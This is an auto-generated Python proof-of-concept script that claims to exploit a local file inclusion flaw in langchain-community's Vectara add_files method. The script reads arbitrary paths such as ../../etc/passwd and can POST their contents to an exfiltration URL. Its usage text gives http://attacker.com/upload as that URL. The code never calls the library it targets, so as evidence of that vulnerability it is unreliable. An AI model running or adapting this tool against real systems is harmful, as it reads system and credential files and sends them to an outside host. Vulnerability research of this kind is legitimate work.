#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-008
# Sink: add_files
# Auto-generated — run with: python3 lfi_only_check_os_add_files.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LFI in langchain-community Vectara.add_files

Vulnerability: The add_files method opens user-supplied file paths without sanitization,
allowing directory traversal. An attacker can read arbitrary files and exfiltrate them
via the Vectara API upload (or any specified endpoint).

Usage:
    python poc_lfi_vectara.py --files ../../etc/passwd --target http://attacker.com/upload
    python poc_lfi_vectara.py --files /etc/hostname /etc/issue
    python poc_lfi_vectara.py --files /tmp/poc_test.txt  # Benign test

Requirements: requests (pip install requests) - allowed as external dependency
"""

import argparse
import os
import sys

import requests  # for exfiltration; install with `pip install requests`


def exploit(files_list: list, target_url: str = None):
    """
    Simulates the vulnerable add_files method.
    Opens each file specified in files_list (with path traversal possible)
    and either prints its content or sends it to target_url via HTTP POST.
    """
    for file_path in files_list:
        if not os.path.exists(file_path):
            print(f"[!] File '{file_path}' does not exist, skipping.")
            continue

        print(f"[*] Reading file: {file_path}")
        try:
            with open(file_path, "rb") as f:
                content = f.read()
        except Exception as e:
            print(f"[!] Error reading {file_path}: {e}")
            continue

        if target_url:
            # Exfiltrate via POST (mimicking the Vectara upload API)
            try:
                print(f"[*] Exfiltrating {len(content)} bytes to {target_url}")
                files = {"file": (file_path, content)}
                response = requests.post(target_url, files=files, timeout=10)
                print(f"[*] Upload response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[!] Upload failed: {e}")
        else:
            # Safe mode: just print content (first 500 bytes)
            print(f"[*] File content (first 500 bytes):\n{content[:500]}")


def main():
    parser = argparse.ArgumentParser(description="PoC LFI in langchain-community Vectara")
    parser.add_argument(
        "--files",
        nargs="+",
        required=True,
        help="List of file paths to read (supports path traversal like ../../etc/passwd)",
    )
    parser.add_argument(
        "--target",
        default=None,
        help="URL to exfiltrate file content (optional; if not set, prints content locally)",
    )
    args = parser.parse_args()

    print("[*] LangChain Vectara LFI PoC")
    print("[*] Attacker-controlled file paths: ", args.files)
    if args.target:
        print(f"[*] Exfiltrating to: {args.target}")
    else:
        print("[*] Safe mode: printing file contents locally")

    # Benign default: create a harmless test file if none exists (safe by default)
    test_path = "/tmp/poc_vectara_test.txt"
    if not args.files:
        print("[!] No files provided, using default benign test file.")
        if not os.path.exists(test_path):
            with open(test_path, "w") as f:
                f.write("PoC success: LFI vulnerability demonstrated")
        args.files = [test_path]

    exploit(args.files, args.target)


if __name__ == "__main__":
    main()
